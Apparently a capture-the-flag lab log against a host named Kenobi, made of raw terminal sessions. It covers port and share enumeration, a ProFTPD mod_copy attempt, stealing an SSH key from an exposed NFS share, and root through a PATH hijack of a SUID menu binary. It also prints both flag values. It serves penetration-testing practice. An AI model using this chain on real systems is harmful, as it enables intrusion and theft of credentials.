```
nmap -sS -sV -A 10.49.147.60                                     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 17:37 -0400
Nmap scan report for 10.49.147.60
Host is up (0.049s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:2c:32:e3:de:94:14:a7:5e:95:e2:be:2c:a4:4b:9b (RSA)
|   256 d3:a4:25:b3:c7:6b:4d:59:62:47:08:33:09:e5:53:a1 (ECDSA)
|_  256 9c:7d:96:9d:53:2c:76:e7:f4:2a:d3:9d:b9:46:8c:60 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33737/udp   mountd
|   100005  1,2,3      36489/udp6  mountd
|   100005  1,2,3      41343/tcp   mountd
|   100005  1,2,3      52045/tcp6  mountd
|   100021  1,3,4      34507/tcp   nlockmgr
|   100021  1,3,4      40255/tcp6  nlockmgr
|   100021  1,3,4      47391/udp   nlockmgr
|   100021  1,3,4      57275/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=6/6%OT=21%CT=1%CU=31952%PV=Y%DS=3%DC=T%G=Y%TM=6A249348
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%C
OS:I=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD
OS:=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8
OS:NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W
OS:3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=
OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-06-06T21:38:13
|_  start_date: N/A

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   49.99 ms 192.168.128.1
2   ...
3   50.66 ms 10.49.147.60

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.79 seconds
                                                             
```

***Not output***
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.49.147.60
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 17:31 -0400
Nmap scan report for 10.49.147.60
Host is up (0.050s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds

```

```
smbclient //10.49.147.60/anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Sat Aug  9 09:03:22 2025
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9183416 blocks of size 1024. 2991584 blocks available
smb: \> cat log.txt
cat: command not found
smb: \> pwd
Current directory is \\10.49.147.60\anonymous\
smb: \> cd log.txt 
cd \log.txt\: NT_STATUS_NOT_A_DIRECTORY
smb: \> ^C

```


***Not output***
```
smbget -R smb://10.49.147.60/anonymous
handle_name_resolve_order: WARNING: Ignoring invalid list value 'smb://10.49.147.60/anonymous' for parameter 'name resolve order'
Downloaded 0b in 0 seconds
```

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.49.147.60
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 17:35 -0400
Nmap scan report for 10.49.147.60
Host is up (0.049s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| ??????????  ?    ?    ?     ?                    ..
| rwxr-xr-x   0    0    4096  2026-06-06T21:14:30  backups
| rwxr-xr-x   0    0    4096  2025-08-10T06:48:58  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2026-06-06T21:05:56  log
| rwxr-xr-x   0    0    4096  2025-08-09T13:38:21  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9183416.0  5701240.0  2991580.0  66%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
                                                           
```

```
nc 10.49.147.60 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.147.60]
SITE CPFR /home/kenobi/.ssh/id
rsa550 /home/kenobi/.ssh/id: No such file or directory
421 Login timeout (300 seconds): closing control connection
                                                           
```

```
msf > searchsploit ProFTPD 1.3.5
[*] exec: searchsploit ProFTPD 1.3.5

---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                   | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                         | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                     | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                   | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
msf > Interrupt: use the 'exit' command to quit

```

```
mkdir /mnt/kenobiNFS
mount 10.49.147.60:/var /mnt/kenobiNFS

```


```
ls -la /mnt/kenobiNFS
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Jun  6 17:45 ..
drwxr-xr-x  2 root root  4096 Jun  6 17:14 backups
drwxr-xr-x 15 root root  4096 Aug 10  2025 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 51 root root  4096 Aug 10  2025 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 13 root avahi 4096 Jun  6 17:05 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  5 root root  4096 Aug  9  2025 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  8 root root  4096 Jun  6 17:12 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www

```

```

cp /mnt/kenobiNFS/tmp/id_rsa .

sudo chmod 600 id_rsa

ls -l id_rsa

```


```
 ls -l id_rsa                           
-rw------- 1 root root 1675 Jun  6 17:55 id_rsa
                                               
```

```
ssh -i id_rsa kenobi@10.49.170.51                     
The authenticity of host '10.49.170.51 (10.49.170.51)' can't be established.
ED25519 key fingerprint is: SHA256:2vE/MNpfiTZ/TuG4PmWZgcn9v1W7rObHKn1POkj8DRE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.170.51' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro


```
```
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 

```


```

kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sat, 06 Jun 2026 22:29:41 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo "/bin/sh" > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# ls
curl
snap-private-tmp
systemd-private-f86770a0bdc54c209878525a4107bc5b-apache2.service-srGlTf
systemd-private-f86770a0bdc54c209878525a4107bc5b-ModemManager.service-Y8F9Ki
systemd-private-f86770a0bdc54c209878525a4107bc5b-systemd-logind.service-UuMl4f
systemd-private-f86770a0bdc54c209878525a4107bc5b-systemd-resolved.service-8VsyVe
systemd-private-f86770a0bdc54c209878525a4107bc5b-systemd-timesyncd.service-NRMQug
# cd ..
# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
# cd root
# ls
root.txt  snap
# cd root.txt   
/bin/sh: 7: cd: can't cd to root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02
# 

```




